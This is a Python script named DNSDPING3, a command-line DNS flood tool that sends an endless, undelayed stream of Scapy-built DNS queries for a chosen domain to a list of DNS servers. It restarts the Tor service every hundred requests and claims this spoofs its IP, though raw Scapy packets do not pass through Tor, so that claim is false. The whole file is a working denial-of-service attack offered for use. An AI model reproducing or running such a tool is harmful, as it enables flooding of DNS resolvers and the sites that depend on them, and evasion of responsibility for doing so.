import argparse
import os
import subprocess
import time
import requests
from colorama import init, Fore
from scapy.all import *
from rich.panel import Panel

# Initialize Colorama
init(autoreset=True)

def banner():
    banner ="""
    [bold blue]
       ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
       |||
       |||                            DNSDPING3 
       |||
       |||
       ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
    
    """
    print(banner)
    
def check_sudo():
    """Check if the script is running with sudo privileges."""
    if os.geteuid() != 0:
        print(Fore.RED + "This script requires sudo privileges. Please run with 'sudo'.")
        exit(1)

def change_tor_ip():
    """Change the Tor IP by restarting the Tor service."""
    try:
        command = 'sudo service tor restart'
        subprocess.run(command, shell=True, check=True)
        time.sleep(1)  # Wait for Tor to change the IP
        print(Fore.GREEN + f"Changed Tor IP address ")
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"Error changing Tor IP {e}")
        exit(1)


def load_dns_servers(file_path):
    """Load DNS servers from a file."""
    try:
        with open(file_path, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(Fore.RED + "DNS server file not found.")
        return []

def launch_flood( domain, dns_servers, verbose):
    """Launch a DNS flood attack."""
    print(Fore.YELLOW + f"Starting DNS flood attack on  with DNS servers: {', '.join(dns_servers)}...")

    count = 0  # Counter for DNS requests

    while True:
        for dns in dns_servers:
            try:
                # Create a DNS query using Scapy
                dns_query = IP(dst=dns)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain, qtype='A'))

                # Send the DNS query
                send(dns_query, verbose=0)

                if verbose:
                    print(Fore.BLUE + f"Sent DNS query to {dns} for {domain}...")

                count += 1

                # Change Tor IP after sending 100  DNS requests
                if count % 100 == 0:
                    change_tor_ip()


                time.sleep(0)  # Delay between requests
                
            except Exception as e:
                print(Fore.RED + f"Error during DNS flood: {e}")

def main():
    banner()
    check_sudo()  # Check for sudo permissions
    parser = argparse.ArgumentParser(description="DNS Flood Tool with Tor IP Spoofing")
    parser.add_argument('-d', required=True, help="Domain to flood")
    parser.add_argument('-f', help="File with DNS servers (one per line)")
    parser.add_argument('-v', action='store_true', help="Verbose output")
    args = parser.parse_args()

    # Load DNS servers from a file or use default
    dns_servers = load_dns_servers(args.f) if args.f else ['8.8.8.8']
    
    launch_flood( args.d, dns_servers, args.v)

if __name__ == "__main__":
    main()
